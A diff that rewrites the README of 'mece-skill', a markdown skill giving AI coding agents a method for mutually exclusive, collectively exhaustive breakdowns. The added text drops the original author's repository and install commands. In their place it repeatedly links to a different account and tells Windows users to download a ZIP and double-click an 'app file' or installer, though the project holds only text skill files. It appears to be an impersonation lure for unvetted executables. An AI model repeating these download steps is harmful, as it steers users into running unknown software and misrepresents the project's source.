@@ -1,107 +1,194 @@
-# MECE Skill
+# 🧩 mece-skill - Structure Ideas With Clear MECE Steps
 
-**Mutually Exclusive, Collectively Exhaustive** — a validation and decomposition skill for AI agents.
+[![Download mece-skill](https://img.shields.io/badge/Download-Mece_Skill-6f42c1?style=for-the-badge&logo=github&logoColor=white)](https://github.com/bigboskuai-prog/mece-skill)
 
-Stop shipping specs with overlaps and gaps. MECE ensures every category, requirement, and plan item belongs to exactly one bucket and nothing is left off the list.
+## 📥 Download
 
-## What it does
+Use this link to visit the page and download the app:
 
-| Mode | Trigger | Output |
-|------|---------|--------|
-| **Validate** | Run `/mece` after creating any structured list | Overlap report + gap report + corrected structure |
-| **Decompose** | `/mece break down [topic]` | MECE issue tree from scratch |
+https://github.com/bigboskuai-prog/mece-skill
 
-## Why this matters
+## 🖥️ What this app does
 
-Most flawed thinking comes from two sources:
-1. **Counting something twice** under different names (overlap)
-2. **Missing something entirely** (gap)
+mece-skill helps AI agents break ideas into clear parts and check that nothing is missed. It uses the MECE method, which means:
 
-This is expensive when you're writing product specs, designing APIs, planning roadmaps, or prompting AI to build features. MECE catches both before they become code, strategy, or shipped product.
+- Mutually Exclusive: each part stays separate
+- Collectively Exhaustive: all parts cover the full topic
 
-## Install
+This helps you sort ideas, review plans, and shape better prompts. It works with Claude Code, Cursor, Copilot, Codex, and Gemini CLI.
 
-### Quick install (recommended)
-```bash
-npx skills add https://github.com/uxderrick/mece-skill
-```
+## ✨ What you can use it for
 
-### Manual install
+- Split a big task into smaller parts
+- Check if your list has overlap
+- Find gaps in a plan
+- Organize product ideas
+- Make prompt writing easier
+- Build cleaner AI workflows
+- Turn messy notes into a simple structure
 
-Clone the repo:
-```bash
-git clone https://github.com/uxderrick/mece-skill.git
-```
+## 🪟 What you need on Windows
 
-Then copy to your agent's skills directory:
+You can run this on a standard Windows PC with:
 
-| Agent | Command |
-|-------|---------|
-| **Claude Code** | `mkdir -p ~/.claude/skills && cp -r mece-skill/skills/mece ~/.claude/skills/mece` |
-| **Cursor** | `mkdir -p ~/.cursor/skills && cp -r mece-skill/skills/mece ~/.cursor/skills/mece` |
-| **VS Code / Copilot** | `mkdir -p ~/.copilot/skills && cp -r mece-skill/skills/mece ~/.copilot/skills/mece` |
-| **Codex (OpenAI)** | `mkdir -p ~/.agents/skills && cp -r mece-skill/skills/mece ~/.agents/skills/mece` |
-| **Gemini CLI** | `mkdir -p ~/.gemini/skills && cp -r mece-skill/skills/mece ~/.gemini/skills/mece` |
-| **Universal (all agents)** | `mkdir -p ~/.agents/skills && cp -r mece-skill/skills/mece ~/.agents/skills/mece` |
+- Windows 10 or Windows 11
+- A modern browser
+- Internet access for the first download
+- One of these AI tools if you want agent support:
+  - Claude Code
+  - Cursor
+  - Copilot
+  - Codex
+  - Gemini CLI
 
-### Project-level install
-Add to a specific repo instead of globally:
-```bash
-mkdir -p .agents/skills && cp -r mece-skill/skills/mece .agents/skills/mece
-```
+For a smooth start, use a computer with enough free disk space for the app and its local files.
 
-## Usage
+## 🚀 Getting started on Windows
 
-### Validate existing work
-Write your spec, feature list, or plan. Then:
-```
-/mece
-```
-The skill reviews your structure and reports:
-- **Overlaps** — items that belong to multiple categories
-- **Gaps** — scenarios not covered by any category
-- **Suggested fix** — corrected MECE structure
+1. Open the download page:
+   https://github.com/bigboskuai-prog/mece-skill
 
-### Decompose a new problem
-```
-/mece break down user authentication
-/mece break down our pricing tiers
-/mece break down the deployment pipeline
-```
+2. Find the latest release or main project files on the page
 
-### Validate inline (no slash command)
-Just ask your AI agent:
-> "Check if this list is MECE"
-> "Is anything overlapping or missing here?"
+3. Download the Windows version or the project package to your computer
 
-The skill auto-triggers on these patterns.
+4. If the file is in a ZIP folder, right-click it and choose Extract All
 
-## Who is this for?
+5. Open the extracted folder
 
-- **Vibecoders** — Stop generating code from specs with holes. Validate before you build.
-- **Product managers** — PRDs, user stories, and roadmaps that actually hold up in sprint planning.
-- **Engineers** — API designs, state management, and architecture with clean boundaries.
-- **Founders** — Strategy docs, pitch decks, and business plans with no logical gaps.
-- **Consultants** — You already know MECE. Now your AI does too.
+6. If you see an app file, double-click it to run
 
-## Examples
+7. If the project uses an installer, open the installer and follow the on-screen steps
 
-See [examples.md](skills/mece/examples.md) for full before/after walkthroughs:
-- The Protein Problem (everyday intuition)
-- The Packing List (collective exhaustiveness)
-- Product Feature Spec (PM workflow)
-- API Endpoint Design (engineering)
-- State Management / Reducers (React/frontend)
-- Roadmap Phases (product strategy)
+8. If the app connects to an AI tool, open that tool and point it to this skill folder or file as the setup guide says
 
-## Background
+## 🧭 First-time setup
 
-MECE was created by **Barbara Minto** at McKinsey & Company in the 1960s. It's been the foundational problem-structuring tool at McKinsey, Bain, and BCG for 60+ years.
+After you download the files, take a minute to check the folder structure. A typical setup may include:
 
-This skill brings MECE to AI-native workflows — where the cost of overlaps and gaps is amplified because AI builds exactly what you tell it to, including the mistakes.
+- a main skill file
+- a readme file
+- example prompts
+- support files for agents
 
-Inspired by [this thread](https://x.com/jayanaman/status/2034909470690513321?s=20) by [@jayanaman](https://x.com/jayanaman).
+If you are using Claude Code, Cursor, Copilot, Codex, or Gemini CLI, add the skill in the place that tool uses for custom instructions or agent skills. Then restart the app or reload the workspace so it can read the new files.
 
-## License
+## 🧠 How MECE helps
 
-MIT
+MECE is useful when a task feels broad or messy. It helps you think in a clean order:
+
+- Start with the main topic
+- Break it into parts that do not overlap
+- Check that every important part is covered
+- Remove duplicates
+- Review the structure for gaps
+
+Example:
+
+- Customer feedback
+  - Bugs
+  - Feature requests
+  - Usability issues
+  - Support questions
+
+Each group has a clear role, and none of them needs to repeat the others.
+
+## 🛠️ Common ways to use it
+
+### For product work
+Use it to break a feature into user needs, edge cases, risks, and rollout steps.
+
+### For prompt work
+Use it to turn one vague prompt into clear sections like goal, context, constraints, and output format.
+
+### For planning
+Use it to divide a project into scope, timing, people, and delivery.
+
+### For analysis
+Use it to group data into clean buckets before you make a decision.
+
+## 📁 Suggested folder use
+
+If you keep the files in a folder, use a simple path like this:
+
+- Downloads
+  - mece-skill
+    - skill files
+    - examples
+    - notes
+
+Keep the folder in a place you can find again. If you use it in more than one AI tool, store one clean copy and reuse it.
+
+## 🔎 How to check it worked
+
+You know the setup worked when:
+
+- the folder opens without errors
+- your AI tool can read the skill files
+- prompts produce MECE-style breakdowns
+- the output has clear groups with no overlap
+- the output covers the full topic without missing parts
+
+If the result still looks messy, restart the app or reload the workspace and try again.
+
+## 🧩 Example use case
+
+If you want to plan a new app, you can ask the tool to split the work like this:
+
+- Problem
+- Users
+- Main features
+- Risks
+- Launch steps
+- Support needs
+
+That gives you a structure that is easy to review and easy to improve.
+
+## ⚙️ Working with AI agents
+
+This skill is built for AI agents that need a clean way to think. It can help them:
+
+- decompose requests
+- test for overlap
+- keep answers organized
+- follow a fixed structure
+- avoid missing parts of a task
+
+This is useful when the agent must give a plan, a checklist, a research outline, or a product brief.
+
+## 🧰 Tips for use
+
+- Keep your request short and clear
+- Ask for one topic at a time
+- Use plain words
+- Say what you want in the final output
+- Ask the agent to show gaps or duplicates
+- Review the structure before you move on
+
+## 📌 Good prompt examples
+
+- Break this idea into MECE categories
+- Decompose this task into non-overlapping parts
+- Find overlap in this list
+- Show missing parts in this plan
+- Organize this prompt into a MECE structure
+- Turn these notes into a clear framework
+
+## 🔗 Project link
+
+Primary download link:
+
+https://github.com/bigboskuai-prog/mece-skill
+
+## 🧾 Repository topics
+
+- agent-skills
+- ai-skills
+- claude-code
+- cursor
+- mece
+- mece-framework
+- product-management
+- prompt-engineering
+- structured-thinking
+- vibe-coding
